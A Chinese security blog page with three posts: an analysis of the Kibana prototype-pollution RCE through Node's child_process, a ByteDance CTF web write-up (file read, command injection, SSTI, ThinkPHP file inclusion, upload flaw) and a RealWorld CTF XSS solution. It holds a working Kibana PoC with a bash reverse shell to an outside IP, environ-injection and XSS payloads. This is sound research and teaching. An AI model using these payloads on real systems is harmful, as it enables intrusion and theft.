<p>这里就存在一个问题，options默认为空对象，那么它的<strong>任何属性</strong>都存在被污染的可能。所以只要能污染到<code>Object.prototype</code>，那么options就可以添加我们想要的任何属性，包括<code>options.env</code>。经过<code>normalizeSpawnArguments</code>封装并返回后，建立新的子进程<code>new ChildProcess()</code>，这里才算进入内部child_process的实现。</p>
<pre><code>var opts = normalizeSpawnArguments.apply(null, arguments);
var options = opts.options;
var child = new ChildProcess();

child.spawn({
file: opts.file,
args: opts.args,
cwd: options.cwd,
windowsVerbatimArguments: !!options.windowsVerbatimArguments,
detached: !!options.detached,
envPairs: opts.envPairs,
stdio: options.stdio,
uid: options.uid,
gid: options.gid
});</code></pre><p>我们直接看<code>ChildProcess.spawn</code>如何实现，也就是原生的spawn。核心代码逻辑是下面的两句，具体代码在<code>process_wrap.cc</code></p>
<pre><code>ChildProcess.prototype.spawn = function(options) {
  //...
  var err = this._handle.spawn(options);
  //...
  // Add .send() method and start listening for IPC data
  if (ipc !== undefined) setupChannel(this, ipc);
  return err;
};</code></pre><p><code>this._handle.spawn</code>调用了<code>process_wrap.cc</code>的spawn来生成子进程，是node子进程创建的底层实现，那我们看一下<code>process_wrap.cc</code>中对options的值进行了怎样的操作，。</p>
<pre><code>  static void Spawn(const FunctionCallbackInfo&lt;Value&gt;&amp; args) {
    //获取js传过来的第一个option参数
    Local&lt;Object&gt; js_options = args[0]-&gt;ToObject(env-&gt;context()).ToLocalChecked();

    ...
    // options.env
    Local&lt;Value&gt; env_v =
        js_options-&gt;Get(context, env-&gt;env_pairs_string()).ToLocalChecked();
    if (!env_v.IsEmpty() &amp;&amp; env_v-&gt;IsArray()) {
      Local&lt;Array&gt; env_opt = Local&lt;Array&gt;::Cast(env_v);
      int envc = env_opt-&gt;Length();
      CHECK_GT(envc + 1, 0);  // Check for overflow.
      options.env = new char*[envc + 1];  // Heap allocated to detect errors.
      for (int i = 0; i &lt; envc; i++) {
        node::Utf8Value pair(env-&gt;isolate(),
                             env_opt-&gt;Get(context, i).ToLocalChecked());
        options.env[i] = strdup(*pair);
        CHECK_NOT_NULL(options.env[i]);
      }
      options.env[envc] = nullptr;
    }
    ...

    //调用uv_spawn生成子进程，并将父进程的event_loop传递过去
    int err = uv_spawn(env-&gt;event_loop(), &amp;wrap-&gt;process_, &amp;options);
    //省略
  }</code></pre><p>代码只截取了对env这个属性的操作，它将原先的envPairs进行封装。最后所有options带入<code>uv_spawn</code>来生成子进程，在<code>uv_spawn</code>中就是常规的fork()、waitpid()来控制进程的产生和资源释放，不过有一个非常重要的实现如下:</p>
<pre><code>//process.cc-&gt;uv_spawn()

execvp(options-&gt;file, options-&gt;args);</code></pre><p>execvp来执行任务，这里的options-&gt;file就是我们最初传给spawn的参数。比如我们的例子是<code>spawn(&#39;whoami&#39;)</code>，那么此时的file就是<code>whoami</code>，当然对于有参数的命令，则options-&gt;args与之对应。</p>
<h2 id="总结流程"><a href="#总结流程" class="headerlink" title="总结流程"></a>总结流程</h2><p>child_process创建子进程的流程看起来有些复杂，总结一下:</p>
<p>1、初始化子进程需要的参数，设置环境变量<br>2、fork()创建子进程，并用<code>execvp</code>执行系统命令。<br>3、ipc通信，输出捕捉</p>
<h1 id="Kibana-RCE"><a href="#Kibana-RCE" class="headerlink" title="Kibana-RCE"></a>Kibana-RCE</h1><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>首先引用漏洞原作者的举例<br><img src="http://static.zybuluo.com/1160307775/bhalsijd98obd3c2u5bctmpz/image_1dpfrsth1180fc11uprr5j1r0713.png" alt="image_1dpfrsth1180fc11uprr5j1r0713.png-74.8kB"></p>
<p>node的官方文档中也能找到相同的用例:<a href="https://nodejs.org/api/cli.html#cli_node_options_options，node版本&gt;v8.0.0以后支持运行node时增加一个命令行参数NODE_OPTIONS，它能够包含一个js脚本，相当于include。" target="_blank" rel="noopener">https://nodejs.org/api/cli.html#cli_node_options_options，node版本&gt;v8.0.0以后支持运行node时增加一个命令行参数NODE_OPTIONS，它能够包含一个js脚本，相当于include。</a><br><img src="http://static.zybuluo.com/1160307775/dtx12zmomo7zm16h5mu9mvd8/image_1dpfrn6951t43bqt2prj21l9im.png" alt="image_1dpfrn6951t43bqt2prj21l9im.png-142.2kB"></p>
<p>在node进程启动的时候作为环境变量加载，通过打印process.env也能证明</p>
<pre><code>hpdoger@ChocoMacBook-Pro$ NODE_OPTIONS=&#39;--require ./evil.js&#39; node
success!!!

&gt; process.env.NODE_OPTIONS
&#39;--require ./evil.js&#39;</code></pre><p>如果我们能改变本地环境变量，则在node创建进程的时候就可以包含恶意语句。尝试用export来实现如下。<br><img src="http://static.zybuluo.com/1160307775/39a5x7o5hdzs8ql0pbo3cbho/image_1dpfsa9vei1kk2g1f5a1qchv531g.png" alt="image_1dpfsa9vei1kk2g1f5a1qchv531g.png-27.1kB"></p>
<p>事实证明，只要产生新进程就会加载一次本地环境变量，存储形式为process.env，若env中存在NODE_OPTIONS则进行相应的加载。但是这种需要bash漏洞就是耍流氓，于是作者想到了一种方法来污染process.env，也就是上文分析的env的获取，于是有了Kibana的poc</p>
<pre><code>.es(*).props(label.__proto__.env.AAAA=&#39;require(&quot;child_process&quot;).exec(&quot;bash -i &gt;&amp; /dev/tcp/192.168.0.136/12345 0&gt;&amp;1&quot;);process.exit()//&#39;)
.props(label.__proto__.env.NODE_OPTIONS=&#39;--require /proc/self/environ&#39;)</code></pre><p>node运行时会把当前进程的env写进系统的环境变量，子进程也一样，在linux中存储为<code>/proc/self/environ</code>。通过污染env把恶意的语句写进/proc/self/environ。同时污染<code>process.NODE_OPTIONS</code>属性，使node在生成新进程的时候，包含我们构造的<code>/proc/self/environ</code>。具体操作就类似下面的用法<br><img src="http://static.zybuluo.com/1160307775/401us91ytoegl88xvsh0zj3a/image_1dpftrvc7qk59jmbjg17lk1f4b2d.png" alt="image_1dpftrvc7qk59jmbjg17lk1f4b2d.png-23.8kB"></p>
<p>污染了Object.env之后，利用Canvas生成新进程的时候会执行spawn从而RCE</p>
<h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>最开始我并没有跟进Kibana的源码，只是把漏洞归结于:</p>
<pre><code>污染Object.env+创建子进程 =&gt; RCE</code></pre><p>于是我做了下面的测试，发现并没有像我想象中的输出evil.js中的内容，但是NODE_OPTIONS确实被写进了子进程的env。<br><img src="http://static.zybuluo.com/1160307775/pxl3up7lfbbj8966hg0t49cu/image_1dpfugpbejdu1cos1cra12pv11mr4p.png" alt="image_1dpfugpbejdu1cos1cra12pv11mr4p.png-102.2kB"></p>
<p>当我将进程建立换为<code>proc.fork()</code>时，则成功加载了evil.js并输出<br><img src="http://static.zybuluo.com/1160307775/400rh8hi6z4231wta13ll6l6/image_1dpfuioo51pov0m17et1as61ibf56.png" alt="image_1dpfuioo51pov0m17et1as61ibf56.png-126.9kB"></p>
<p>child_process.fork() 方法是 child_process.spawn() 的一个特例，专门用于衍生新的 Node.js 进程。 与 child_process.spawn() 一样返回 ChildProcess 对象。所以fork调用的是spawn来实现的子进程创建，那怎么会有这种情况？跟进一下fork看看实现有什么不同</p>
<pre><code>exports.fork = function(modulePath /*, args, options*/) {
    ...//省略
    options.execPath = options.execPath || process.execPath;
    return spawn(options.execPath, args, options);
}</code></pre><p>它处理了execPath这个属性，默认获取系统变量的process.execPath，再传入spawn，这里就是<code>node</code>。<br><img src="http://static.zybuluo.com/1160307775/3som47zksrvzoyeta5xufflt/image_1dpfv09ba1lqiq4eglf17fmdgc63.png" alt="image_1dpfv09ba1lqiq4eglf17fmdgc63.png-62.4kB"></p>
<p>而我们用spawn时，处理得到的file为<code>whoami</code><br><img src="http://static.zybuluo.com/1160307775/l68vdzmr5twb7bkh9dwtpw1i/image_1dpfvg05d1kth1o5n6adan9b8k6g.png" alt="image_1dpfvg05d1kth1o5n6adan9b8k6g.png-202.9kB"></p>
<p>上文分析child_process在子进程创建的最底层，会调用execvp执行命令执行file</p>
<pre><code>execvp(options-&gt;file, options-&gt;args);</code></pre><p>而上面poc核心就是<code>NODE_OPTIONS=&#39;--require /proc/self/environ&#39; node</code>，即bash调用了node去执行。所以此处的file值必须为node，否则无法将NODE_OPTIONS载入。而直接调用spawn函数时必须有file值，这也造成了第一种代码无法加载evil.js的情况<br><img src="http://static.zybuluo.com/1160307775/sj60p3ly3wetghpqf9oitvn5/image_1dpg0ajvt1b051icfapj1eaupi67a.png" alt="image_1dpg0ajvt1b051icfapj1eaupi67a.png-58.5kB"></p>
<p>经过测试exec、execFile函数无论传入什么命令，file的值都会为<code>/bin/sh</code>，因为参数shell默认为true。即使不传入options选项，这两个命令也会默认定义options，这也是child_process防止命令执行的一种途径。<br><img src="http://static.zybuluo.com/1160307775/5ed7bm1z723crkc08l0279cr/image_1dpg1kbn81deo1e4aeai11jebbn9.png" alt="image_1dpg1kbn81deo1e4aeai11jebbn9.png-26kB"></p>
<p>但是shell这个变量也是可以被污染的，不过child_process在这里做了限制，即使shell===false或字符串。最终传到execvp时也会被执行的参数替代，而不是真正的node进程。</p>
<p>这样看来在污染了原型的条件下，child_process只有进行了fork()的时候，才能达到漏洞的利用。不过这样的利用面确实太窄了，如果有师傅研究过其他函数的执行spawn时能启动node进程，可以交流一下思路</p>
<p>所以回到fork()函数，我们可以验证包含/proc/self/environ是可行的</p>
<pre><code>// test.js
proc = require(&#39;child_process&#39;);
var aa = {}
aa.__proto__.env = {&#39;AAAA&#39;:&#39;console.log(123)//&#39;,&#39;NODE_OPTIONS&#39;:&#39;--require /proc/self/environ&#39;}
proc.fork(&#39;./function.js&#39;);

//function.js
console.log(&#39;this is func&#39;)</code></pre><p><img src="http://static.zybuluo.com/1160307775/uzueehmtlujd7zwq0belponu/image_1dpindplj1ocv1q5o1ksf11v510o89.png" alt="image_1dpindplj1ocv1q5o1ksf11v510o89.png-23.3kB"></p>
<p>同时可以看到，fork在指定了modulepath的情况下，包含environ的同时并不影响modulepath中代码的执行。</p>
<h1 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h1><p><a href="https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/" target="_blank" rel="noopener">Exploiting prototype pollution – RCE in Kibana (CVE-2019-7609)</a><br><a href="http://cnode1.rssing.com/chan-68517434/all_p385.html" target="_blank" rel="noopener">spawn、exec、execFile和fork</a><br><a href="https://mp.weixin.qq.com/s?__biz=MzA4NzA5OTYzNw==&mid=2247483761&idx=1&sn=a366c51bd57b4fead862d11616a10b19&chksm=903fd0eba74859fd6ba296e29bf600a1004eeed72de3fb433c74d47654ce37a435e6d1e2742c&mpshare=1&scene=1&srcid=&sharer_sharetime=1571588210071&sharer_shareid=3674d5df50965fb924ba35f64042cb57&key=a2eb8c0b2340b20d3581c0a15949a693ac0879f7879b201f3878bc1f796bf6e8225380e8c186fbea7a3f5abb3c67841d7f71500c9619d916c3ced85f20b5d9cefdb3980e259d7e0c59132aada59c4132&ascene=1&uin=MTMyNzEzMTk2NQ%3D%3D&devicetype=Windows+10&version=62070152&lang=zh_CN&pass_ticket=866ICVsXH4EG%2FSMhWF45HLNA4E5jKkn%2Fh4V6bsGMzepRRdEW4YsHhfvV84kkAfIA" target="_blank" rel="noopener">Kibana漏洞之javascript原型链污染</a></p>

                
            </div>
            <div class="continue">
            <a href="/2019/11/20/从Kibana-RCE对nodejs子进程创建的思考/">
            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
            </a>
            </div>
        </article>
        
        <article class="post">
            <h1>
                <a class="title" href="/2019/10/20/字节跳动CTF线下赛Web题解&复盘/"> 
                    字节跳动CTF线下赛Web题解&amp;复盘 
                </a>
            </h1>
                        <div class="meta">
                <a class="date"> 
                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
                    2019-10-20   
                </a>
                
                
                
                <a class="tag">
                    <i class="fa fa-tags" aria-hidden="true"></i>  
                </a>
                
                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/AWD/">AWD</a></li></ul>
            </div>
            <div class="content">
                
                <h1 id="字节跳动CTF线下赛Web题解-amp-复盘"><a href="#字节跳动CTF线下赛Web题解-amp-复盘" class="headerlink" title="字节跳动CTF线下赛Web题解&amp;复盘"></a>字节跳动CTF线下赛Web题解&amp;复盘</h1><h1 id="PythonWeb"><a href="#PythonWeb" class="headerlink" title="PythonWeb"></a>PythonWeb</h1><h2 id="做题小谈"><a href="#做题小谈" class="headerlink" title="做题小谈"></a>做题小谈</h2><p>之前线下赛没运维过pythonweb，踩了很多坑，小记一下。</p>
<p>flask在更改代码后要重启才能生效，但是如果<code>app.DEBUG=True</code>则不需要重启flask，这个配置多见于<code>config.py</code>，比赛的时候也可以全局搜索。</p>
<p>目录结构如下<br><img src="http://static.zybuluo.com/1160307775/44a650nlxazo4hlxfio2jpd6/image_1dnm2lc67dmv18gg4fn1d95fq5m.png" alt="image_1dnm2lc67dmv18gg4fn1d95fq5m.png-112.2kB"></p>
<p>在pyweb的awd中，<strong>一定要先<code>ps -ef</code>看一下系统的进程，看看原始的服务是怎么启动的，我们就可以照着它的命令去重启flask</strong>，而不至于把服务启崩。这次我就是没有看进程，自己相当然的用命令<code>flask run</code>，结果被down了好几轮。</p>
<p>最后看了下手册，这里pyweb使用gunicorn来启动的：</p>
<pre><code>gunicorn -b 0.0.0.0:5000  manage:app</code></pre><h2 id="漏洞审计"><a href="#漏洞审计" class="headerlink" title="漏洞审计"></a>漏洞审计</h2><h3 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h3><pre><code>@main.route(&#39;/file&#39;)
def file():
    file = request.args.get(&#39;file&#39;,base64.b64encode(&#39;/tmp/Blog_mini/app/static/images/background.jpg&#39;))
    f = open(base64.b64decode(file),&#39;rb&#39;)
    res = f.read()
    return jsonify({&quot;res&quot;:res})</code></pre><p>request.args.get()获取file参数，如果参数不存在则为<code>base64.b64encode(&#39;/tmp/Blog_mini/app/static/images/background.jpg)</code></p>
<h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><p>后台有一点路由<code>/backup</code>，可以调用popen()，那就可以先注册用户，再去rce。同时这个点应该也可以读取任意文件</p>
<pre><code>@main.route(&#39;/backup&#39;,methods = [&#39;GET&#39;])
@login_required
def backup():
    if request.args.get(&#39;name&#39;):
        shell = &#39;tar -zcf ./&#39;+ request.args.get(&#39;name&#39;) +&#39;.tar.gz ./&#39;
        res = os.popen(shell).read()
        ress = {&quot;res&quot;:res}
        return jsonify(ress)
    else:
        return &quot;param is name! please backup!&quot;</code></pre><p><img src="http://static.zybuluo.com/1160307775/xkcvhk7x2py4e8psnoftecq0/image_1dnm8r3b65901pom16tg12t1c031g.png" alt="image_1dnm8r3b65901pom16tg12t1c031g.png-34.8kB"></p>
<h3 id="模版注入"><a href="#模版注入" class="headerlink" title="模版注入"></a>模版注入</h3><p>这个点我没挖到，但是后来听别的师傅说存在404的ssti</p>
<pre><code>@main.app_errorhandler(404)
def page_not_found(e):
    for x in request.path:
        if x in &#39;._%&#39;:
            return render_template(&#39;404.html&#39;), 404
    template = &#39;&#39;&#39;
{%% block body %%}
    &lt;div class=&quot;center-content error&quot;&gt;
        &lt;h1&gt;Oops! That page doesn&#39;t exist in this Blog.&lt;/h1&gt;
        &lt;h3&gt;%s&lt;/h3&gt;
    &lt;/div&gt;
{%% endblock %%}
&#39;&#39;&#39; % (request.url)
    return render_template_string(template), 404</code></pre><p>过滤了<code>._%</code>，下面的ssti是经典的漏洞案例。利用<code>|</code>过滤器和动态传参就可以bypass了，跟今年护网杯的题目思路差不多，这里盗用一下@Smile师傅的payload</p>
<p><img src="http://static.zybuluo.com/1160307775/0ag6778ky7rmn2p6hbxeolyy/image_1dnp66nft9tm243119nifpt49.png" alt="image_1dnp66nft9tm243119nifpt49.png-91.2kB"></p>
<h2 id="流量记录"><a href="#流量记录" class="headerlink" title="流量记录"></a>流量记录</h2><p>这次还是吃了没流量的亏，测试了一下别人的py流量脚本，这里贴出来</p>
<pre><code>@main.before_request
def awdlog():
    import time
    f = open(&#39;/tmp/pylog.txt&#39;,&#39;a+&#39;)
    f.writelines(time.strftime(&#39;%Y-%m-%d %H:%M:%S\n&#39;, time.localtime(time.time())))
    f.writelines(&quot;{method} {url} \n&quot;.format(method=request.method,url=request.url))
    s = &#39;&#39;
    for d,v in dict(request.headers).items():
        s += &quot;%s: %s\n&quot;%(d,v)
    f.writelines(s+&#39;\n&#39;)
    s = &#39;&#39;
    for d,v in dict(request.form).items():
        s += &quot;%s=%s&amp;&quot;%(d,v)
    f.writelines(s.strip(&quot;&amp;&quot;))
    f.writelines(&#39;\n\n&#39;)
    f.close()</code></pre><p><strong>main</strong>指的是应用名，每次根据实际情况更改，最终在/tmp下生成日志<br><img src="http://static.zybuluo.com/1160307775/4ly8u0z2pqen24kyzhml5qt1/image_1dnn61c77p61mvu1v011ini1qtt7e.png" alt="image_1dnn61c77p61mvu1v011ini1qtt7e.png-533.4kB"></p>
<h1 id="Opensns"><a href="#Opensns" class="headerlink" title="Opensns"></a>Opensns</h1><p>基于TP3.2.2开发，比赛复现出两个漏洞。其中一个是内置后门就不说了，还有一个是渲染模版时的任意文件读取漏洞</p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="任意文件读取-1"><a href="#任意文件读取-1" class="headerlink" title="任意文件读取"></a>任意文件读取</h3><p><code>keywords[_filename]=/flag</code></p>
<p>漏洞点在<code>ThinkPHP/Library/Think/Storage/Driver/File.class.php</code>的File类驱动中，同时File类继承自Storage类：<code>class File extends Storage</code></p>
<p><img src="http://static.zybuluo.com/1160307775/19r0bw8jrs4a14a8r9emc8c6/image_1dnmqjgof1rfhksv1ae71engq2320.png" alt="image_1dnmqjgof1rfhksv1ae71engq2320.png-396.7kB"></p>
<p>在判断了$vars是否存在后，进行了一次变量覆盖，再调用load方法进行了文件包含。追踪一下哪里调用了load方法，发现都是在解析模版的时候调用的，这里选择文件<code>ThinkPHP/ThinkPHP/Library/Think/Template.class.php</code>的fetch()方法</p>
<p><img src="http://static.zybuluo.com/1160307775/qoihow4a22x8pzdf9i9eoxiv/image_1dnmrrf2k138168g9gm12sfoip2t.png" alt="image_1dnmrrf2k138168g9gm12sfoip2t.png-245.5kB"></p>
<p>发现可控参数<code>$templateVar</code>，会被当作实参传入load()，继续寻找调用fetch()方法的位置。因为TP代码中有很多实例化的方法，并不都像<code>storage::</code>这样的调用方式，只能全局搜索fetch看哪里调用。最终发现在<code>ThinkPHP/Library/Behavior/ParseTemplateBehavior.class.php</code>中实例化了Template类并且调用fetch()方法。</p>
<p><img src="http://static.zybuluo.com/1160307775/fmsgcdfr846jsn5g71sardnt/image_1dnms90lf1fbckc91cnr18281g1c3a.png" alt="image_1dnms90lf1fbckc91cnr18281g1c3a.png-505.2kB"></p>
<p>刚才说到可控参数<code>$templateVar</code>的原型在这里为<code>$_data</code>，那么<code>$_data</code>是否可控？继续追调用链，在这里追的时候就卡壳了，因为涉及到tp的一个知识：<a href="https://blog.csdn.net/u013927110/article/details/47000379" target="_blank" rel="noopener">Thinkphp下利用钩子使用行为扩展</a></p>
<p>简单来说就在xx文件中，先宏定义了监听器对应的类名再加载进程序(这里的类指的是类似于ParseTemplateBehavior.class.php这种的行为拓展类)<br><img src="http://static.zybuluo.com/1160307775/ab7rmh3hiapj8i4ns6dqrwvi/image_1dnmt4sfa1c6ja0pgb4v00mft4q.png" alt="image_1dnmt4sfa1c6ja0pgb4v00mft4q.png-50.2kB"></p>
<p>而后，程序中的Hook机制通过触发不同类型的监听器，实现对应行为拓展类的实例化且会调用对应行为拓展类的run方法。一个简单的触发机制就是<code>Hook::Listen(tags,prarm)</code>。</p>
<p>那么在这里我们希望它触发<code>view_parse</code>，从而实例化<code>ParseTemplateBehavior</code>。就全局搜索<code>Hook::listen(&#39;view_parse&#39;</code>。在TP的视图类里找到了该监听器的hook<br><img src="http://static.zybuluo.com/1160307775/d7u78w1qao6dkos6xtce62gw/image_1dnmtdrpd6t6101m1omechn1n0857.png" alt="image_1dnmtdrpd6t6101m1omechn1n0857.png-507.6kB"></p>
<p>接下来就好说了，只要<code>$parama</code>可控，并且找到一处能够调用fetch函数的地方，整条利用链就完整了。</p>
<p>其中$param的取值经过一系列的操作</p>
<pre><code>public function assign($name, $value = &#39;&#39;)
{
    if (is_array($name)) {
        $this-&gt;tVar = array_merge($this-&gt;tVar, $name);
    } else {
        $this-&gt;tVar[$name] = $value;
    }
}

$params = array(&#39;var&#39; =&gt; $this-&gt;tVar, &#39;file&#39; =&gt; $templateFile, &#39;content&#39; =&gt; $content, &#39;prefix&#39; =&gt; $prefix);</code></pre><p>file、content、prefix为定值，只有<code>$this-&gt;tvar</code>可操作且被assign函数赋值。这里存在以前tp3的模版rce漏洞的挖掘链，通过assign这个模版赋值函数，赋值变量<code>$this-&gt;tvar</code>。</p>
<p>同时这里还涉及Tp的一个小操作：在tp3.2中，对模版的加载&amp;渲染依靠<code>ThinkPHP/ThinkPHP/Library/Think/View.class.php</code>。先通过View类方法<code>assgin()</code>对模版赋值，再调用<code>display()</code>加载模板和页面输出。在display函数的内部同时实现了<code>fetch()</code>函数解析并获取模板内容，也解决了上面调用fetch函数的困扰。</p>
<p>所以只需要找一个Controller，接受post/get传入参数，并且能够传入<code>assign()</code>去模版赋值，之后再经过tp的<code>display()</code>函数渲染模版，这里出题人在控制器里造了一个方法search，接受keywords参数</p>
<pre><code>public function search()
{
    $keywords=I(&#39;post.keywords&#39;,&#39;&#39;,&#39;text&#39;);

    $modules = D(&#39;Common/Module&#39;)-&gt;getAll();
    foreach ($modules as $m) {
        if ($m[&#39;is_setup&#39;] == 1 &amp;&amp; $m[&#39;entry&#39;] != &#39;&#39;) {
            if (file_exists(APP_PATH . $m[&#39;name&#39;] . &#39;/Widget/SearchWidget.class.php&#39;)) {
                $mod[] = $m[&#39;name&#39;];
            }
        }
    }
    $show_search = get_kanban_config(&#39;SEARCH&#39;, &#39;enable&#39;, $mod, &#39;Home&#39;);

    $this-&gt;assign($keywords);
    $this-&gt;assign(&#39;showBlocks&#39;, $show_search);
    $this-&gt;display();
}</code></pre><p>构造如下poc本地包含文件，由于开启了ob_start()。<br><img src="http://static.zybuluo.com/1160307775/rxlpeekkh3xij9ql2ltkfr7m/image_1dnn1fspe10st1i4rbe6nt1p6g5k.png" alt="image_1dnn1fspe10st1i4rbe6nt1p6g5k.png-208.2kB"></p>
<p>总结来说，该点漏洞就是加载模版的时候，把本地文件作为模版变量赋值，再渲染到页面。这个在平常的代码审计中也是一个不错的思路，膜出题人。</p>
<h1 id="douchat"><a href="#douchat" class="headerlink" title="douchat"></a>douchat</h1><p>同样使用TP3.2.2开发的</p>
<h2 id="漏洞浮现"><a href="#漏洞浮现" class="headerlink" title="漏洞浮现"></a>漏洞浮现</h2><h3 id="代码注入"><a href="#代码注入" class="headerlink" title="代码注入"></a>代码注入</h3><p>跟opensns类似的漏洞，也是模版的渲染，只不过这次存在content参数，即生成的缓存有效时，加载缓存造成代码注入。由于开启了ob_start()，因此在include的时候代码注入<br><img src="http://static.zybuluo.com/1160307775/rqxm9hrlwxtkdfxn6xznrey2/image_1dnn52qdims3v3217dm1s6ph8f6h.png" alt="image_1dnn52qdims3v3217dm1s6ph8f6h.png-535.2kB"></p>
<h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><p>漏洞文件：/Public/Plugins/webuploader/server/preview.php</p>
<pre><code>$src = file_get_contents(&#39;php://input&#39;);
if (preg_match(&quot;#^data:image/(\w+);base64,(.*)$#&quot;, $src, $matches)) {

    $previewUrl = sprintf(
        &quot;%s://%s%s&quot;,
        isset($_SERVER[&#39;HTTPS&#39;]) &amp;&amp; $_SERVER[&#39;HTTPS&#39;] != &#39;off&#39; ? &#39;https&#39; : &#39;http&#39;,
        $_SERVER[&#39;HTTP_HOST&#39;],
        $_SERVER[&#39;REQUEST_URI&#39;]
    );
    $previewUrl = str_replace(&quot;preview.php&quot;, &quot;&quot;, $previewUrl);


    $base64 = $matches[2];
    $type = $matches[1];
    if ($type === &#39;jpeg&#39;) {
        $type = &#39;jpg&#39;;
    }

    $filename = md5($base64).&quot;.$type&quot;;
    $filePath = $DIR.DIRECTORY_SEPARATOR.$filename;

    if (file_exists($filePath)) {
        die(&#39;{&quot;jsonrpc&quot; : &quot;2.0&quot;, &quot;result&quot; : &quot;&#39;.$previewUrl.&#39;preview/&#39;.$filename.&#39;&quot;, &quot;id&quot; : &quot;id&quot;}&#39;);
    } else {
        $data = base64_decode($base64);
        file_put_contents($filePath, $data);
        die(&#39;{&quot;jsonrpc&quot; : &quot;2.0&quot;, &quot;result&quot; : &quot;&#39;.$previewUrl.&#39;preview/&#39;.$filename.&#39;&quot;, &quot;id&quot; : &quot;id&quot;}&#39;);
    }

} else {
    die(&#39;{&quot;jsonrpc&quot; : &quot;2.0&quot;, &quot;error&quot; : {&quot;code&quot;: 100, &quot;message&quot;: &quot;un recoginized source&quot;}}&#39;);
}</code></pre><p><code>$src</code>可控，通过伪协议控制生成的文件名，然后写入到preview/下并回显出来</p>

                
            </div>
            <div class="continue">
            <a href="/2019/10/20/字节跳动CTF线下赛Web题解&复盘/">
            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
            </a>
            </div>
        </article>
        
        <article class="post">
            <h1>
                <a class="title" href="/2019/09/24/RealWorld CTF2019 两道XSS-Web题解/"> 
                    RealWorld CTF2019 两道XSS-Web题解 
                </a>
            </h1>
                        <div class="meta">
                <a class="date"> 
                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
                    2019-09-24   
                </a>
                
                
                
                <a class="tag">
                    <i class="fa fa-tags" aria-hidden="true"></i>  
                </a>
                
                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web/">Web</a></li></ul>
            </div>
            <div class="content">
                
                <h1 id="RealWorld-CTF2019-两道XSS-Web题解"><a href="#RealWorld-CTF2019-两道XSS-Web题解" class="headerlink" title="RealWorld CTF2019 两道XSS-Web题解"></a>RealWorld CTF2019 两道XSS-Web题解</h1><p>原文首发于安全客:<a href="https://www.anquanke.com/post/id/186707" target="_blank" rel="noopener">https://www.anquanke.com/post/id/186707</a></p>
<h2 id="Mission-Invisible"><a href="#Mission-Invisible" class="headerlink" title="Mission Invisible"></a>Mission Invisible</h2><p>题目上来把代码全部给出来了，一段js并且告诉我们有两个隐藏的点</p>
<pre><code>&lt;script&gt;
    var getUrlParam = function (name) {
        var reg = new RegExp(&quot;(^|&amp;)&quot; + name + &quot;=([^&amp;]*)(&amp;|$)&quot;);
        var r = unescape(window.location.search.substr(1)).match(reg);
        if (r != null) return r[2];
        return null;
    }

    function setCookie(name, value) {
        var Days = 30;
        var exp = new Date();
        exp.setTime(exp.getTime() + Days * 24 * 60 * 60 * 30);
        document.cookie = name + &quot;=&quot; + value + &quot;;expires=&quot; + exp.toGMTString();
    }

    function getCookie(name) {
        var search = name + &quot;=&quot;
        var offset = document.cookie.indexOf(search)
        if (offset != -1) {
            offset += search.length;
            var end = document.cookie.indexOf(&quot;;&quot;, offset);
            if (end == -1) {
                end = document.cookie.length;
            }
            return unescape(document.cookie.substring(offset, end));
        }
        else return &quot;&quot;;
    }

    function setElement(tag) {
        tag = tag.substring(0, 1);
        var ele = document.createElement(tag)
        var attrs = getCookie(&quot;attrs&quot;).split(&quot;&amp;&quot;);
        for (var i = 0; i &lt; attrs.length; i++) {
            var key = attrs[i].split(&quot;=&quot;)[0];
            var value = attrs[i].split(&quot;=&quot;)[1];
            ele.setAttribute(key, value);
        }
        document.body.appendChild(ele);
    }

    var tag = getUrlParam(&quot;tag&quot;);
    setCookie(&quot;tag&quot;, tag);
    setElement(tag);

&lt;/script&gt;</code></pre><p>重点在这个<code>setElement</code>函数，通过tag.substring(0, 1)创建一个dom事件，然后从cookie种取出attrs属性进行标签属性的赋值。接下来追一下cookie是怎么入库的</p>
<pre><code>var tag = getUrlParam(&quot;tag&quot;);
setCookie(&quot;tag&quot;, tag);</code></pre><p>追到函数不难发现是tag传参进去的，并且在<code>getcookie</code>函数中只截取了”attrs=”的后面的值，那么我们就可以在value里插入attrs的值。</p>
<p><img src="http://static.zybuluo.com/1160307775/8nnawoe6cckqbj8v45i7u28p/image_1dksu3lma1sdcaodk0j19g11tn213.png" alt="image_1dksu3lma1sdcaodk0j19g11tn213.png-115.9kB"></p>
<p>所以现在的难点就在于怎么构造一个标签，在浏览器解析的时候自动触发XSS。由于<code>tag = tag.substring(0, 1);</code>这段代码，使得我们现在能用的标签只有a、p。</p>
<p>最初我的想法是污染原型链，在循环遍历attrs的时候：</p>
<pre><code>第一次key = __proto__.ele  &amp; value = document.createElement(“script”)

第二次 key = src  &amp; value = evil.com</code></pre><p>但是尝试了一下发现这样并不能够成功污染，因为我们已经定义了ele这个变量。那只能从a、p标签下手，这里@LFY师傅想到一个很好的方法</p>
<p><img src="http://static.zybuluo.com/1160307775/qxend2mls2etcgiz0das8h9z/image_1dksuhiqvuci17tssl8o111eh720.png" alt="image_1dksuhiqvuci17tssl8o111eh720.png-97.5kB"></p>
<pre><code>&lt;p onfocus=&quot;alert(document.cookie)&quot; id=&quot;1&quot; tabindex=&quot;0&quot;&gt;&lt;/p&gt;</code></pre><p>我们可以通过tableindex使标签可聚焦，只需要在url后面跟一个锚点指向标签id，类似于<code>#1</code>，这样聚焦时触发onfocus，效果就等效于自动触发xss。</p>
